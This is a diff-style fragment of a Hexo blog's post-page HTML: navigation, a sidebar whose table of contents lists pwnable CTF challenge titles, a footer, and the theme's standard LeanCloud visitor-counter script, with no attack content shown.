+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/21/Pwnable-tw/" rel="next" title="Pwnable.tw">
+                <i class="fa fa-chevron-left"></i> Pwnable.tw
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/TAMUctf/" rel="prev" title="TAMUctf">
+                TAMUctf <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#brain-fuck"><span class="nav-number">1.</span> <span class="nav-text">brain fuck</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5-calculator"><span class="nav-number">2.</span> <span class="nav-text">md5 calculator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#simple-login"><span class="nav-number">3.</span> <span class="nav-text">simple login</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#otp"><span class="nav-number">4.</span> <span class="nav-text">otp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">5.</span> <span class="nav-text">#</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
